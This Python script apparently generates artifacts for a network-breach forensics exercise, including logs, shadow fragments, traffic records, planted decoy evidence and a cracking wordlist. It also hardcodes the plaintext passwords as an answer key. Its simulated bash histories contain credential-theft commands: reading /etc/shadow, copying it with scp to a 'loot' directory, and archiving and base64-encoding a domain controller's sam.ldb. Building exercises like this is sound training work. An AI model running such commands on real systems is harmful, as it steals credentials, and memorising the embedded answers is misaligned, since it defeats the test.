#!/usr/bin/env python3
"""Generate forensic artifacts for the breach analysis task.

Creates artifacts across 4 hosts in a segmented network, including
genuine attack evidence AND attacker-planted anti-forensics decoys.
"""

import os
import subprocess
import random

random.seed(42)


def gen_hash(algo, salt, password):
    """Generate password hash using openssl passwd."""
    flag = {6: '-6', 5: '-5', 1: '-1'}[algo]
    result = subprocess.run(
        ['openssl', 'passwd', flag, '-salt', salt, password],
        capture_output=True, text=True, check=True
    )
    return result.stdout.strip()


# Create directory structure
dirs = [
    '/app/artifacts/host_websvr01',
    '/app/artifacts/host_jumpbox',
    '/app/artifacts/host_filesvr01',
    '/app/artifacts/host_dc01',
]
for d in dirs:
    os.makedirs(d, exist_ok=True)

# ===========================================================================
# Generate password hashes for compromised accounts
# 4 genuine + 1 decoy (dev_ops planted by attacker)
# ===========================================================================
h_webadmin = gen_hash(6, 'wEbSaLt01', 'Summer2023!')
h_svc_monitor = gen_hash(1, 'jB0xSaLt', 'M0nit0r@2023')
h_backup_svc = gen_hash(5, 'fIlEsAlT', 'B@ckup!2023')
h_adm_file = gen_hash(6, 'dC0sAlTx', 'F1leSvc2023!')
h_dev_ops = gen_hash(6, 'dEvOpSaLt', 'Deploy@23')

# ===========================================================================
# Edge Firewall Logs
# ===========================================================================
fw_lines = []
fw_lines.append("# Edge Firewall Logs - FW-EDGE01")
fw_lines.append("# Format: TIMESTAMP DEVICE ACTION PROTO SRC -> DST len=BYTES ttl=TTL")
fw_lines.append("#" + "=" * 70)

noise_ips = ['198.51.100.10', '198.51.100.20', '198.51.100.30',
             '192.0.2.100', '192.0.2.200']
for i in range(50):
    h = random.randint(0, 4)
    m = random.randint(0, 59)
    s = random.randint(0, 59)
    src = random.choice(noise_ips)
    dport = random.choice([80, 443, 8080, 8443])
    action = random.choice(['ALLOW', 'ALLOW', 'DENY'])
    sport = random.randint(30000, 65000)
    blen = random.randint(40, 1500)
    ttl = random.randint(50, 128)
    fw_lines.append(
        f"2024-03-15 {h:02d}:{m:02d}:{s:02d} FW-EDGE01 {action} TCP "
        f"{src}:{sport} -> 10.10.10.50:{dport} len={blen} ttl={ttl}"
    )

# Attacker SSH connections
for s in [0, 1, 2]:
    sport = 48231 + s
    fw_lines.append(
        f"2024-03-15 02:45:{s:02d} FW-EDGE01 ALLOW TCP "
        f"203.0.113.45:{sport} -> 10.10.10.50:22 len=52 ttl=64"
    )

# Exfiltration: large outbound transfer much later
for i in range(20):
    s = min(i * 3, 59)
    sport = random.randint(40000, 50000)
    fw_lines.append(
        f"2024-03-15 04:25:{s:02d} FW-EDGE01 ALLOW TCP "
        f"10.10.10.50:{sport} -> 203.0.113.45:443 len=1460 ttl=64"
    )

# NOTE: No firewall entries from 172.16.5.50 — the phantom IP never
# appears in edge firewall logs because it doesn't exist.

header = fw_lines[:3]
data = sorted(fw_lines[3:])
with open('/app/artifacts/firewall_logs.txt', 'w') as f:
    f.write('\n'.join(header + data) + '\n')

# ===========================================================================
# WEBSVR01 artifacts
# ===========================================================================
with open('/app/artifacts/host_websvr01/auth.log', 'w') as f:
    for i in range(5):
        ip = f"198.51.100.{random.randint(1, 50)}"
        pid = random.randint(3000, 4000)
        m = random.randint(0, 14)
        s = random.randint(0, 59)
        f.write(
            f"Mar 15 02:{m:02d}:{s:02d} WEBSVR01 sshd[{pid}]: "
            f"Failed password for invalid user admin from {ip} "
            f"port {random.randint(30000, 65000)} ssh2\n"
        )
    f.write(
        "Mar 15 02:45:00 WEBSVR01 sshd[4521]: Accepted password for "
        "webadmin from 203.0.113.45 port 48231 ssh2\n"
    )
    f.write(
        "Mar 15 02:45:00 WEBSVR01 sshd[4521]: pam_unix(sshd:session): "
        "session opened for user webadmin(uid=1001) by (uid=0)\n"
    )
    f.write(
        "Mar 15 03:00:00 WEBSVR01 CRON[5010]: pam_unix(cron:session): "
        "session opened for user root(uid=0) by (uid=0)\n"
    )

with open('/app/artifacts/host_websvr01/ps_output.txt', 'w') as f:
    f.write("# Process listing from WEBSVR01 - captured 2024-03-15 03:00:00 UTC\n")
    f.write("# ps auxww output\n")
    f.write("USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n")
    f.write("root         1  0.0  0.1 169344 11432 ?        Ss   Feb15   0:03 /sbin/init\n")
    f.write("root       432  0.0  0.0  72304  6124 ?        Ss   Feb15   0:00 /usr/sbin/sshd -D\n")
    f.write("www-data   891  0.0  0.2 274556 20480 ?        S    Feb15   0:12 /usr/sbin/apache2 -k start\n")
    f.write("www-data   892  0.0  0.2 274556 20480 ?        S    Feb15   0:10 /usr/sbin/apache2 -k start\n")
    f.write("mysql      950  0.1  1.5 1756416 122880 ?      Ssl  Feb15   5:32 /usr/sbin/mysqld\n")
    f.write("webadmin  4521  0.0  0.1  92160  8960 ?        S    02:45   0:00 sshd: webadmin@pts/0\n")
    f.write("webadmin  4525  0.0  0.0  21472  5120 pts/0    Ss   02:45   0:00 -bash\n")
    f.write("webadmin  4890  0.0  0.1  82944  7680 pts/0    S+   02:48   0:00 ssh -D 9050 svc_monitor@172.16.1.25\n")
    f.write("root      5010  0.0  0.0  55488  3840 ?        S    03:00   0:00 /usr/sbin/cron -f\n")
    f.write("syslog    5020  0.0  0.0 263040  5120 ?        Ssl  Feb15   0:01 /usr/sbin/rsyslogd -n\n")

with open('/app/artifacts/host_websvr01/shadow_fragment.txt', 'w') as f:
    f.write("# Recovered /etc/shadow entries from WEBSVR01\n")
    f.write("# NOTE: File permissions were 644 (misconfigured)\n")
    f.write(f"root:$6$rOoTsAlT${'Q' * 86}:19400:0:99999:7:::\n")
    f.write(f"webadmin:{h_webadmin}:19450:0:99999:7:::\n")
    f.write("www-data:*:19300:0:99999:7:::\n")
    f.write("sshd:*:19300:0:99999:7:::\n")
    f.write("mysql:!:19300:0:99999:7:::\n")

with open('/app/artifacts/host_websvr01/ifconfig.txt', 'w') as f:
    f.write("# ifconfig output from WEBSVR01\n")
    f.write("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n")
    f.write("        inet 10.10.10.50  netmask 255.255.255.0  broadcast 10.10.10.255\n")
    f.write("        ether 00:50:56:94:aa:01  txqueuelen 1000  (Ethernet)\n\n")
    f.write("eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n")
    f.write("        inet 172.16.1.10  netmask 255.255.255.0  broadcast 172.16.1.255\n")
    f.write("        ether 00:50:56:94:aa:02  txqueuelen 1000  (Ethernet)\n\n")
    f.write("lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n")
    f.write("        inet 127.0.0.1  netmask 255.0.0.0\n")

# WEBSVR01 bash_history — contains PLANTED entries alongside real ones
with open('/app/artifacts/host_websvr01/bash_history_fragment.txt', 'w') as f:
    f.write("# Recovered .bash_history fragment from webadmin@WEBSVR01\n")
    f.write("whoami\n")
    f.write("id\n")
    f.write("cat /etc/shadow\n")
    f.write("ip addr show\n")
    f.write("ssh dev_ops@172.16.5.50\n")
    f.write("scp /etc/shadow dev_ops@172.16.5.50:/tmp/loot/\n")
    f.write("ssh -D 9050 svc_monitor@172.16.1.25\n")
    f.write("netstat -antp\n")

# ===========================================================================
# JUMPBOX artifacts
# ===========================================================================
with open('/app/artifacts/host_jumpbox/auth.log', 'w') as f:
    # FABRICATED entry planted by attacker — timestamp BEFORE breach started,
    # source IP 172.16.5.50 has no corresponding host in any ifconfig
    f.write(
        "Mar 15 02:30:00 JUMPBOX sshd[5501]: Accepted password for "
        "dev_ops from 172.16.5.50 port 44100 ssh2\n"
    )
    f.write(
        "Mar 15 02:30:00 JUMPBOX sshd[5501]: pam_unix(sshd:session): "
        "session opened for user dev_ops(uid=1010) by (uid=0)\n"
    )
    # Normal CRON entries
    for i in range(3):
        m = random.randint(0, 40)
        pid = random.randint(1000, 2000)
        f.write(
            f"Mar 15 02:{m:02d}:00 JUMPBOX CRON[{pid}]: "
            "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\n"
        )
    # GENUINE entry — attacker arrived via WEBSVR01
    f.write(
        "Mar 15 02:48:00 JUMPBOX sshd[6721]: Accepted password for "
        "svc_monitor from 172.16.1.10 port 39122 ssh2\n"
    )
    f.write(
        "Mar 15 02:48:00 JUMPBOX sshd[6721]: pam_unix(sshd:session): "
        "session opened for user svc_monitor(uid=1002) by (uid=0)\n"
    )

with open('/app/artifacts/host_jumpbox/ps_output.txt', 'w') as f:
    f.write("# Process listing from JUMPBOX - captured 2024-03-15 03:15:00 UTC\n")
    f.write("# ps auxww output\n")
    f.write("USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n")
    f.write("root           1  0.0  0.1 169344 11432 ?        Ss   Feb15   0:03 /sbin/init\n")
    f.write("root         512  0.0  0.0  72304  6124 ?        Ss   Feb15   0:00 /usr/sbin/sshd -D\n")
    f.write("nagios      1020  0.0  0.1 132096 12288 ?        Sl   Feb15   0:15 /usr/sbin/nrpe --config=/etc/nagios/nrpe.cfg\n")
    f.write("svc_moni+   6721  0.0  0.1  92160  8960 ?        S    02:48   0:00 sshd: svc_monitor@pts/0\n")
    f.write("svc_moni+   6725  0.0  0.0  21472  5120 pts/0    Ss   02:48   0:00 -bash\n")
    f.write("svc_moni+   6801  0.0  0.1  82944  7680 pts/0    S+   02:52   0:00 ssh -L 8443:localhost:443 backup_svc@172.16.5.30\n")
    f.write("root        7010  0.0  0.0  55488  3840 ?        S    03:00   0:00 /usr/sbin/cron -f\n")
    # NOTE: No process for dev_ops / PID 5501 — the auth.log claims
    # dev_ops logged in at 02:30, but no matching session or process
    # appears in the ps output captured at 03:15.

with open('/app/artifacts/host_jumpbox/shadow_fragment.txt', 'w') as f:
    f.write("# Recovered /etc/shadow entries from JUMPBOX\n")
    f.write(f"root:$6$jMpBxRt0${'R' * 86}:19400:0:99999:7:::\n")
    f.write(f"svc_monitor:{h_svc_monitor}:19420:0:99999:7:::\n")
    f.write("nagios:!:19300:0:99999:7:::\n")
    # PLANTED by attacker — dev_ops account added to shadow to
    # support the fabricated auth.log entry
    f.write(f"dev_ops:{h_dev_ops}:19420:0:99999:7:::\n")

with open('/app/artifacts/host_jumpbox/ifconfig.txt', 'w') as f:
    f.write("# ifconfig output from JUMPBOX\n")
    f.write("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n")
    f.write("        inet 172.16.1.25  netmask 255.255.255.0  broadcast 172.16.1.255\n")
    f.write("        ether 00:50:56:94:bb:01  txqueuelen 1000  (Ethernet)\n\n")
    f.write("eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n")
    f.write("        inet 172.16.5.1  netmask 255.255.255.0  broadcast 172.16.5.255\n")
    f.write("        ether 00:50:56:94:bb:02  txqueuelen 1000  (Ethernet)\n\n")
    f.write("lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n")
    f.write("        inet 127.0.0.1  netmask 255.0.0.0\n")

with open('/app/artifacts/host_jumpbox/netstat_output.txt', 'w') as f:
    f.write("# netstat -antp output from JUMPBOX - captured 2024-03-15 03:15:00 UTC\n")
    f.write("Active Internet connections (servers and established)\n")
    f.write("Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n")
    f.write("tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      512/sshd\n")
    f.write("tcp        0      0 172.16.1.25:22          172.16.1.10:39122       ESTABLISHED 6721/sshd\n")
    f.write("tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      6801/ssh\n")
    f.write("tcp        0      0 172.16.5.1:48901        172.16.5.30:22          ESTABLISHED 6801/ssh\n")
    f.write("tcp        0      0 0.0.0.0:5666            0.0.0.0:*               LISTEN      1020/nrpe\n")
    # NOTE: No connection from 172.16.5.50 visible in netstat,
    # contradicting the auth.log claim of dev_ops connecting.

# ===========================================================================
# FILESVR01 artifacts
# ===========================================================================
with open('/app/artifacts/host_filesvr01/auth.log', 'w') as f:
    f.write(
        "Mar 15 02:52:00 FILESVR01 sshd[8901]: Accepted password for "
        "backup_svc from 172.16.5.1 port 48901 ssh2\n"
    )
    f.write(
        "Mar 15 02:52:00 FILESVR01 sshd[8901]: pam_unix(sshd:session): "
        "session opened for user backup_svc(uid=1003) by (uid=0)\n"
    )
    f.write(
        "Mar 15 03:00:00 FILESVR01 smbd[700]: "
        "[2024/03/15 03:00:00] server/service.c: Normal SMB operations active\n"
    )

with open('/app/artifacts/host_filesvr01/ps_output.txt', 'w') as f:
    f.write("# Process listing from FILESVR01 - captured 2024-03-15 03:30:00 UTC\n")
    f.write("# ps auxww output\n")
    f.write("USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n")
    f.write("root           1  0.0  0.1 169344 11432 ?        Ss   Feb15   0:03 /sbin/init\n")
    f.write("root         600  0.0  0.0  72304  6124 ?        Ss   Feb15   0:00 /usr/sbin/sshd -D\n")
    f.write("root         700  0.0  0.2 524288 16384 ?        Ssl  Feb15   0:30 /usr/sbin/smbd --foreground --no-process-group\n")
    f.write("backup_s+   8901  0.0  0.1  92160  8960 ?        S    02:52   0:00 sshd: backup_svc@pts/0\n")
    f.write("backup_s+   8905  0.0  0.0  21472  5120 pts/0    Ss   02:52   0:00 -bash\n")
    f.write("backup_s+   9100  0.0  0.1  82944  7680 pts/0    S+   02:55   0:00 ssh -L 5445:localhost:445 adm_file@192.168.100.50\n")
    f.write("root        9200  0.0  0.0  55488  3840 ?        S    03:00   0:00 /usr/sbin/cron -f\n")

with open('/app/artifacts/host_filesvr01/shadow_fragment.txt', 'w') as f:
    f.write("# Recovered /etc/shadow entries from FILESVR01\n")
    f.write(f"root:$6$fIlErOoT${'V' * 86}:19400:0:99999:7:::\n")
    f.write(f"backup_svc:{h_backup_svc}:19460:0:99999:7:::\n")
    f.write("smb_svc:!:19300:0:99999:7:::\n")

with open('/app/artifacts/host_filesvr01/ifconfig.txt', 'w') as f:
    f.write("# ifconfig output from FILESVR01\n")
    f.write("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n")
    f.write("        inet 172.16.5.30  netmask 255.255.255.0  broadcast 172.16.5.255\n")
    f.write("        ether 00:50:56:94:cc:01  txqueuelen 1000  (Ethernet)\n\n")
    f.write("eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n")
    f.write("        inet 192.168.100.10  netmask 255.255.255.0  broadcast 192.168.100.255\n")
    f.write("        ether 00:50:56:94:cc:02  txqueuelen 1000  (Ethernet)\n\n")
    f.write("lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n")
    f.write("        inet 127.0.0.1  netmask 255.0.0.0\n")

with open('/app/artifacts/host_filesvr01/netstat_output.txt', 'w') as f:
    f.write("# netstat -antp output from FILESVR01 - captured 2024-03-15 03:30:00 UTC\n")
    f.write("Active Internet connections (servers and established)\n")
    f.write("Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n")
    f.write("tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      600/sshd\n")
    f.write("tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      700/smbd\n")
    f.write("tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      700/smbd\n")
    f.write("tcp        0      0 172.16.5.30:22          172.16.5.1:48901        ESTABLISHED 8901/sshd\n")
    f.write("tcp        0      0 127.0.0.1:5445          0.0.0.0:*               LISTEN      9100/ssh\n")
    f.write("tcp        0      0 192.168.100.10:52100    192.168.100.50:22       ESTABLISHED 9100/ssh\n")

# ===========================================================================
# DC01 artifacts
# ===========================================================================
with open('/app/artifacts/host_dc01/auth.log', 'w') as f:
    f.write(
        "Mar 15 02:55:00 DC01 sshd[10501]: Accepted password for "
        "adm_file from 192.168.100.10 port 52100 ssh2\n"
    )
    f.write(
        "Mar 15 02:55:00 DC01 sshd[10501]: pam_unix(sshd:session): "
        "session opened for user adm_file(uid=1004) by (uid=0)\n"
    )

with open('/app/artifacts/host_dc01/shadow_fragment.txt', 'w') as f:
    f.write("# Recovered /etc/shadow entries from DC01\n")
    f.write(f"root:$6$dC01RoOt${'W' * 86}:19400:0:99999:7:::\n")
    f.write(f"adm_file:{h_adm_file}:19480:0:99999:7:::\n")
    f.write("krbtgt:!:19300:0:99999:7:::\n")

with open('/app/artifacts/host_dc01/bash_history_fragment.txt', 'w') as f:
    f.write("# Recovered .bash_history fragment from adm_file@DC01\n")
    f.write("whoami\n")
    f.write("id\n")
    f.write("uname -a\n")
    f.write("ls -la /var/lib/samba/private/\n")
    f.write("file /var/lib/samba/private/sam.ldb\n")
    f.write("du -sh /var/lib/samba/private/\n")
    f.write("tar czf /tmp/ntds_dump.tar.gz /var/lib/samba/private/sam.ldb /var/lib/samba/private/sam.ldb.d/\n")
    f.write("ls -lh /tmp/ntds_dump.tar.gz\n")
    f.write("cat /tmp/ntds_dump.tar.gz | base64 > /tmp/ntds_dump.b64\n")
    f.write("wc -c /tmp/ntds_dump.b64\n")

# ===========================================================================
# Traffic Summary CSV — includes both genuine and FABRICATED entries
# ===========================================================================
with open('/app/artifacts/traffic_summary.csv', 'w') as f:
    f.write("timestamp,src_ip,dst_ip,src_port,dst_port,protocol,bytes_transferred,note\n")

    # FABRICATED traffic from phantom IP 172.16.5.50
    # These entries predate the actual breach (02:45) and reference
    # a source IP that doesn't exist on any host's interface
    f.write("2024-03-15 02:30:00,172.16.5.50,172.16.1.25,44100,22,TCP,520,\n")
    f.write("2024-03-15 02:31:00,172.16.5.50,172.16.1.25,44100,22,TCP,1460,\n")
    f.write("2024-03-15 02:32:00,172.16.5.50,172.16.1.25,44100,22,TCP,2920,\n")
    f.write("2024-03-15 02:35:00,172.16.5.50,192.168.100.50,44200,22,TCP,520,\n")
    f.write("2024-03-15 02:36:00,172.16.5.50,192.168.100.50,44200,22,TCP,65535,\n")
    f.write("2024-03-15 02:37:00,172.16.5.50,192.168.100.50,44200,22,TCP,65535,\n")
    f.write("2024-03-15 02:38:00,172.16.5.50,192.168.100.50,44200,22,TCP,65535,\n")

    # Normal internal traffic (noise)
    normal_srcs = ['172.16.1.50', '172.16.1.51', '172.16.5.20']
    normal_dsts = ['172.16.5.20', '172.16.1.25', '172.16.5.30']
    for i in range(30):
        h = random.randint(0, 4)
        m = random.randint(0, 59)
        src = random.choice(normal_srcs)
        dst = random.choice(normal_dsts)
        sport = random.randint(30000, 65000)
        dport = random.choice([80, 443, 3306, 445])
        bts = random.randint(100, 8000)
        f.write(f"2024-03-15 {h:02d}:{m:02d}:00,{src},{dst},{sport},{dport},TCP,{bts},routine\n")

    # Genuine exfiltration chain: DC01 -> FILESVR01 -> JUMPBOX -> WEBSVR01 -> Attacker
    for i in range(50):
        s = min(i, 59)
        f.write(f"2024-03-15 04:15:{s:02d},192.168.100.50,192.168.100.10,445,52100,TCP,65535,\n")
    for i in range(50):
        s = min(i, 59)
        f.write(f"2024-03-15 04:16:{s:02d},172.16.5.30,172.16.5.1,22,48901,TCP,65535,\n")
    for i in range(50):
        s = min(i, 59)
        f.write(f"2024-03-15 04:17:{s:02d},172.16.1.25,172.16.1.10,22,39122,TCP,65535,\n")
    for i in range(50):
        sport = 40000 + i
        s = min(i, 59)
        f.write(f"2024-03-15 04:18:{s:02d},10.10.10.50,203.0.113.45,{sport},443,TCP,65535,\n")

# ===========================================================================
# Partial Network Documentation
# ===========================================================================
with open('/app/artifacts/network_info.txt', 'w') as f:
    f.write("# Partial Network Documentation - Recovered from IT SharePoint\n")
    f.write("# Last updated: 2024-01-15\n")
    f.write("#" + "=" * 60 + "\n\n")
    f.write("Network Segments:\n")
    f.write("  - DMZ:         10.10.10.0/24  (internet-facing services)\n")
    f.write("  - Corporate:   172.16.1.0/24  (workstations, admin hosts)\n")
    f.write("  - Server Farm: 172.16.5.0/24  (app servers, file servers)\n")
    f.write("  - Restricted:  192.168.100.0/24 (domain controllers, PKI)\n\n")
    f.write("Known Hosts:\n")
    f.write("  - WEBSVR01: Primary web server (DMZ)\n")
    f.write("  - JUMPBOX:  Administrative jump host (Corporate)\n")
    f.write("  - FILESVR01: Central file server (Server Farm)\n")
    f.write("  - DC01:     Primary domain controller (Restricted)\n\n")
    f.write("Firewall Policy Summary:\n")
    f.write("  Rule 1: Internet -> DMZ:       HTTP(80), HTTPS(443), SSH(22) ALLOW\n")
    f.write("  Rule 2: DMZ -> Corporate:      SSH(22) ALLOW to JUMPBOX only\n")
    f.write("  Rule 3: Corporate -> Servers:   SSH(22), SMB(445), HTTPS(443) ALLOW\n")
    f.write("  Rule 4: Servers -> Restricted:  SSH(22) ALLOW (admin hosts only)\n")
    f.write("  Rule 5: Restricted -> *:        DENY ALL (intended air-gap)\n")
    f.write("  Rule 6: DEFAULT:                DENY ALL\n\n")
    f.write("Host Security Baseline Requirements:\n")
    f.write("  - /etc/shadow permissions: 640 (root:shadow)\n")
    f.write("  - SSH key-based auth preferred; password auth permitted for service accounts\n")
    f.write("  - All admin access must originate from JUMPBOX\n")
    f.write("  - File servers (FILESVR01) are NOT admin hosts — no SSH to Restricted\n\n")
    f.write("NOTE: Some hosts are dual-homed for cross-segment access.\n")
    f.write("Interface assignments not fully documented.\n")

# ===========================================================================
# Wordlist for password cracking
# ===========================================================================
passwords = [
    "Password1", "Welcome1", "Spring2023", "Fall2023!", "Admin123",
    "P@ssw0rd", "Changeme1!", "Qwerty123", "Letmein!", "Dragon2023",
    "Master123", "Access2023", "Trustno1!", "Shadow123", "Michael2023",
    "SuperUser1", "Network123!", "System@2023", "Login!2023", "Guest123",
    "Test2023!", "Demo@123", "Backup123", "Service!23", "Monitor@23",
    "File2023!", "Domain123!", "Admin@2023", "Server123", "Cloud!2023",
    "Winter2023!", "Spring@2023", "Autumn2023!", "December23",
    "January2024!", "Q1_2024!", "Fiscal2023", "Budget@23",
    "Project123!", "Release2023", "Deploy@23", "Pipeline!1",
    "Database2023!", "Cluster@23", "Storage!23", "Volume@2023",
    "Secure2023!", "Crypto@23", "Token!2023", "Session@23",
    "Router2023!", "Switch@23", "Firewall!23", "Gateway@23",
    "Company2023!", "Corp@rate23", "Business!23", "Enterprise@1",
    "Summer2022!", "Summer2024!", "M0nit0r@2022", "M0nit0r@2024",
    "B@ckup!2022", "B@ckup!2024", "F1leSvc2022!", "F1leSvc2024!",
    # Actual passwords mixed in
    "Summer2023!", "M0nit0r@2023", "B@ckup!2023", "F1leSvc2023!",
    # More decoys
    "Pr1ntSvc2023!", "MaIlSvc@2023", "WebApp!2023", "ApiKey@2023",
    "Ldap2023!", "Kerberos@23", "Radius!2023", "Tacacs@2023",
    "Vmware2023!", "Docker@23", "K8s!2023", "Ansible@2023",
    "Terraform!23", "Jenkins@23", "Gitlab!2023", "Github@2023",
    "Splunk2023!", "Elastic@23", "Grafana!23", "Prometheus@2023",
]

random.shuffle(passwords)

with open('/app/wordlist.txt', 'w') as f:
    for p in passwords:
        f.write(p + '\n')

print("All forensic artifacts generated successfully.")
print(f"Hashes generated:")
print(f"  webadmin:    {h_webadmin[:50]}...")
print(f"  svc_monitor: {h_svc_monitor}")
print(f"  backup_svc:  {h_backup_svc[:50]}...")
print(f"  adm_file:    {h_adm_file[:50]}...")
print(f"  dev_ops:     {h_dev_ops[:50]}...")
